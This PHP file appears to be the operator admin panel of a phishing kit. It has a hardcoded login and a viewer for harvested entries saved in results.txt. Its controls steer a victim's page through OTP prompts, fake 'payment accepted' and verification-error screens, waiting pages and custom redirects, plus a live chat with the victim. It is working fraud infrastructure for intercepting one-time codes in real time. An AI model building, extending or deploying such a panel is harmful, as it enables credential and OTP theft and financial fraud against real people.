<?php
session_start();

$stateFile = __DIR__ . '/admin_state.json';
$resultsFile = __DIR__ . '/results.txt';
$chatLogFile = __DIR__ . '/chat_log.json';

$validUser = 'admin';
$validPass = 'JJKadmin2026';
$message = '';

function loadSmsState($file)
{
    $defaults = [
        'mode' => 'default',
        'custom_url' => '',
        'instruction' => 'stay_wait',
        'instruction_token' => time(),
        'chat_enabled' => false
    ];

    if (!file_exists($file)) {
        return $defaults;
    }

    $data = json_decode(file_get_contents($file), true);
    $state = is_array($data) ? array_merge($defaults, $data) : $defaults;

    if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
        $state['mode'] = 'default';
        $state['instruction'] = $state['instruction'] ?? 'otp_pass';
    }

    if (empty($state['instruction_token'])) {
        $state['instruction_token'] = time();
    }

    return $state;
}

function saveSmsState($file, $mode, $customUrl, $instruction, $chatEnabled)
{
    $timestamp = time();
    $payload = [
        'mode' => $mode,
        'custom_url' => $mode === 'redirect_custom' ? trim($customUrl) : '',
        'instruction' => $instruction,
        'instruction_token' => $timestamp,
        'chat_enabled' => (bool) $chatEnabled
    ];

    file_put_contents($file, json_encode($payload, JSON_PRETTY_PRINT));
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if ($user === $validUser && $pass === $validPass) {
        $_SESSION['is_admin'] = true;
    } else {
        $message = 'Invalid username or password.';
    }
}

$isAdmin = !empty($_SESSION['is_admin']);

if ($isAdmin && isset($_POST['sms_mode']) && empty($_POST['ajax'])) {
    $smsMode = $_POST['sms_mode'];
    $customUrl = trim($_POST['custom_url'] ?? '');
    $instruction = $_POST['instruction'] ?? 'stay_wait';
    $chatEnabled = isset($_POST['chat_enabled']);

    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];

    if (!in_array($smsMode, $validModes, true)) {
        $message = 'Invalid SMS mode selection.';
    } elseif (!in_array($instruction, $validInstructions, true)) {
        $message = 'Invalid instruction selection.';
    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
    } else {
        saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
        $message = 'SMS page updated successfully.';
    }
}

if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
    $smsMode = $_POST['sms_mode'] ?? 'default';
    $customUrl = trim($_POST['custom_url'] ?? '');
    $instruction = $_POST['instruction'] ?? 'stay_wait';
    $chatEnabled = !empty($_POST['chat_enabled']);

    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];

    if (!in_array($smsMode, $validModes, true)) {
        $message = 'Invalid SMS mode selection.';
        $success = false;
    } elseif (!in_array($instruction, $validInstructions, true)) {
        $message = 'Invalid instruction selection.';
        $success = false;
    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
        $success = false;
    } else {
        saveSmsState($stateFile, $smsMode, $customUrl, $instruction, $chatEnabled);
        $message = 'SMS page updated successfully.';
        $success = true;
        $currentState = loadSmsState($stateFile);
    }

    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success ?? false,
        'message' => $message,
        'state' => isset($currentState) ? $currentState : loadSmsState($stateFile)
    ]);
    exit;
}

$currentState = loadSmsState($stateFile);
$resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';

$resultsEntries = [];
$page = isset($_GET['page']) ? max(1, (int) $_GET['page']) : 1;
$perPage = 10;

if (trim($resultsContent) !== '') {
    $resultsEntries = array_reverse(preg_split('/\n\s*\n/', trim($resultsContent)) ?: []);
}

$totalEntries = count($resultsEntries);
$totalPages = max(1, (int) ceil($totalEntries / $perPage));
$page = min($page, $totalPages);
$offset = ($page - 1) * $perPage;
$paginatedResults = array_slice($resultsEntries, $offset, $perPage);
$chatLog = file_exists($chatLogFile) ? json_decode(file_get_contents($chatLogFile), true) : [];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0b0b0b;
            color: #f5f5f5;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 980px;
            margin: 40px auto;
            background: #141414;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        h1, h2 {
            margin-top: 0;
        }

        .card {
            background: #1f1f1f;
            padding: 16px;
            border-radius: 6px;
            margin-bottom: 16px;
            border: 1px solid #292929;
        }

        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 12px 20px;
        }

        .form-row {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .form-row label {
            font-weight: 600;
            color: #e5e5e5;
        }

        input[type="text"],
        input[type="password"],
        select,
        textarea {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #333;
            background: #111;
            color: #f5f5f5;
            box-sizing: border-box;
        }

        textarea {
            min-height: 100px;
            resize: vertical;
        }

        .inline-controls {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .inline-controls label {
            margin: 0;
        }

        button {
            padding: 10px 16px;
            border: none;
            border-radius: 4px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #b20710;
        }

        .message {
            padding: 12px;
            background: #1f3b1f;
            border: 1px solid #2e7d32;
            color: #b9f6ca;
            border-radius: 4px;
            margin-bottom: 12px;
        }

        .error {
            background: #3b1f1f;
            border: 1px solid #c62828;
            color: #ffcdd2;
        }

        pre {
            background: #0f0f0f;
            padding: 12px;
            border-radius: 4px;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .login-wrapper {
            max-width: 420px;
            margin: 80px auto;
        }

        .logout-link {
            display: inline-block;
            margin-top: 8px;
            color: #90caf9;
        }

        .chat-box {
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 6px;
            padding: 12px;
            max-height: 260px;
            overflow-y: auto;
            margin-top: 8px;
        }

        .chat-message {
            margin-bottom: 10px;
            padding: 8px;
            border-radius: 6px;
        }

        .chat-message.admin {
            background: #17212b;
            border: 1px solid #2c3e50;
        }

        .chat-message.user {
            background: #1b2a18;
            border: 1px solid #2e7d32;
        }

        .chat-meta {
            font-size: 12px;
            color: #9e9e9e;
        }

        .results-entry {
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 12px;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .results-pagination {
            display: flex;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 12px;
        }

        .results-pagination a,
        .results-pagination span {
            padding: 8px 12px;
            border-radius: 4px;
            border: 1px solid #333;
            background: #1f1f1f;
            color: #f5f5f5;
            text-decoration: none;
        }

        .results-pagination .active {
            background: #e50914;
            border-color: #e50914;
        }

        .results-pagination .disabled {
            opacity: 0.5;
            cursor: default;
        }
    </style>
</head>
<body>
<?php if (!$isAdmin): ?>
    <div class="login-wrapper">
        <div class="card">
            <h1>Admin Login</h1>
            <?php if ($message): ?>
                <div class="message error"><?php echo htmlspecialchars($message); ?></div>
            <?php endif; ?>
            <form method="post" class="form-grid" novalidate>
                <input type="hidden" name="action" value="login">
                <div class="form-row">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>

                <div class="form-row">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>

                <button type="submit">Login</button>
            </form>
        </div>
    </div>
<?php else: ?>
    <div class="container">
        <h1>Admin Panel</h1>
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        <div class="message" id="flash-message" style="display:none;"></div>
        <a class="logout-link" href="?logout=1">Logout</a>

        <div class="card">
            <h2>SMS Page Controls</h2>
            <form method="post" class="form-grid" id="sms-form" novalidate>
                <div class="form-row">
                    <label for="sms_mode">Choose what sms.php should do</label>
                    <select name="sms_mode" id="sms_mode" required>
                        <option value="default" <?php echo $currentState['mode'] === 'default' ? 'selected' : ''; ?>>Show OTP form (default)</option>
                        <option value="payment_accept" <?php echo $currentState['mode'] === 'payment_accept' ? 'selected' : ''; ?>>Show user accepted payment</option>
                        <option value="redirect_wait" <?php echo $currentState['mode'] === 'redirect_wait' ? 'selected' : ''; ?>>Redirect to wait.php?next=sms.php</option>
                        <option value="redirect_custom" <?php echo $currentState['mode'] === 'redirect_custom' ? 'selected' : ''; ?>>Redirect to a specific URL</option>
                        <option value="error_verification" <?php echo $currentState['mode'] === 'error_verification' ? 'selected' : ''; ?>>Show verification error</option>
                    </select>
                </div>

                <div class="form-row">
                    <label for="custom_url">Custom redirect URL (only used for specific URL option)</label>
                    <input type="text" id="custom_url" name="custom_url" value="<?php echo htmlspecialchars($currentState['custom_url']); ?>" placeholder="https://example.com/path">
                </div>

                <div class="form-row">
                    <label for="instruction">Finance instruction for the next user step</label>
                    <select name="instruction" id="instruction">
                        <option value="stay_wait" <?php echo $currentState['instruction'] === 'stay_wait' ? 'selected' : ''; ?>>Keep user on wait.php</option>
                        <option value="prompt_otp" <?php echo $currentState['instruction'] === 'prompt_otp' ? 'selected' : ''; ?>>Send user to SMS to enter OTP</option>
                        <option value="otp_error" <?php echo $currentState['instruction'] === 'otp_error' ? 'selected' : ''; ?>>Send OTP error then let them retry</option>
                        <option value="otp_pass" <?php echo $currentState['instruction'] === 'otp_pass' ? 'selected' : ''; ?>>Show SMS OTP pass</option>
                    </select>
                </div>

                <div class="form-row">
                    <div class="inline-controls">
                        <input type="checkbox" id="chat_enabled" name="chat_enabled" value="1" <?php echo !empty($currentState['chat_enabled']) ? 'checked' : ''; ?>>
                        <label for="chat_enabled">Enable live chat for user</label>
                    </div>
                    <small>Chat appears on user pages only when you enable it here.</small>
                </div>

                <button type="submit">Update SMS Page</button>
            </form>
        </div>

        <div class="card">
            <h2>Live Chat (admin view)</h2>
            <p>Use this area to communicate with the user in real time once chat is enabled.</p>
            <div class="chat-box" id="chat-box">
                <?php if (!empty($chatLog)): ?>
                    <?php foreach ($chatLog as $entry): ?>
                        <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
                            <div><?php echo nl2br(htmlspecialchars($entry['message'])); ?></div>
                            <div class="chat-meta"><?php echo htmlspecialchars(ucfirst($entry['sender'])); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div class="chat-meta">No messages yet.</div>
                <?php endif; ?>
            </div>
            <div class="form-row">
                <label for="admin-chat-message">Send a message</label>
                <textarea id="admin-chat-message" placeholder="Type a message to the user..." <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>></textarea>
                <button type="button" id="send-admin-message" <?php echo empty($currentState['chat_enabled']) ? 'disabled' : ''; ?>>Send</button>
            </div>
        </div>

        <div class="card">
            <h2>Saved Results (results.txt)</h2>
            <?php if ($totalEntries === 0): ?>
                <div class="chat-meta">No results saved yet.</div>
            <?php else: ?>
                <?php foreach ($paginatedResults as $entry): ?>
                    <div class="results-entry"><?php echo nl2br(htmlspecialchars($entry)); ?></div>
                <?php endforeach; ?>

                <?php if ($totalPages > 1): ?>
                    <div class="results-pagination">
                        <?php if ($page > 1): ?>
                            <a href="?page=<?php echo $page - 1; ?>">&laquo; Prev</a>
                        <?php else: ?>
                            <span class="disabled">&laquo; Prev</span>
                        <?php endif; ?>

                        <?php for ($p = 1; $p <= $totalPages; $p++): ?>
                            <?php if ($p === $page): ?>
                                <span class="active"><?php echo $p; ?></span>
                            <?php else: ?>
                                <a href="?page=<?php echo $p; ?>"><?php echo $p; ?></a>
                            <?php endif; ?>
                        <?php endfor; ?>

                        <?php if ($page < $totalPages): ?>
                            <a href="?page=<?php echo $page + 1; ?>">Next &raquo;</a>
                        <?php else: ?>
                            <span class="disabled">Next &raquo;</span>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>
            <?php endif; ?>
        </div>
    </div>
<?php endif; ?>
</body>
<script>
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('admin-chat-message');
    const sendButton = document.getElementById('send-admin-message');
    const smsForm = document.getElementById('sms-form');
    const flashMessage = document.getElementById('flash-message');

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const wrapper = document.createElement('div');
            wrapper.className = `chat-message ${entry.sender}`;
            wrapper.innerHTML = `
                <div>${entry.message.replace(/\n/g, '<br>')}</div>
                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
            `;
            chatBox.appendChild(wrapper);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.messages) {
                renderChat(data.messages);
            }
        } catch (e) {
            console.error('Unable to fetch chat updates', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput || !chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';

        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({ sender: 'admin', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send message', e);
        }
    }

    if (sendButton && chatInput) {
        sendButton.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                sendChatMessage();
            }
        });

        if (!chatInput.disabled) {
            fetchChat();
            setInterval(fetchChat, 3000);
        }
    }

    async function updateSmsState(event) {
        event.preventDefault();
        if (!smsForm) return;

        const formData = new FormData(smsForm);
        formData.append('ajax', 'update_sms');

        try {
            const response = await fetch('admin.php', {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: formData
            });

            const data = await response.json();
            if (flashMessage) {
                flashMessage.style.display = 'block';
                flashMessage.textContent = data.message || 'Update failed.';
                flashMessage.classList.toggle('error', !data.success);
            }

            if (data.state) {
                smsForm.querySelector('#sms_mode').value = data.state.mode;
                smsForm.querySelector('#instruction').value = data.state.instruction;
                const chatCheckbox = smsForm.querySelector('#chat_enabled');
                if (chatCheckbox) {
                    chatCheckbox.checked = !!data.state.chat_enabled;
                }
            }
        } catch (e) {
            console.error('Unable to update SMS page', e);
            if (flashMessage) {
                flashMessage.style.display = 'block';
                flashMessage.textContent = 'Unable to reach the server.';
                flashMessage.classList.add('error');
            }
        }
    }

    if (smsForm) {
        smsForm.addEventListener('submit', updateSmsState);
    }
</script>
</html>
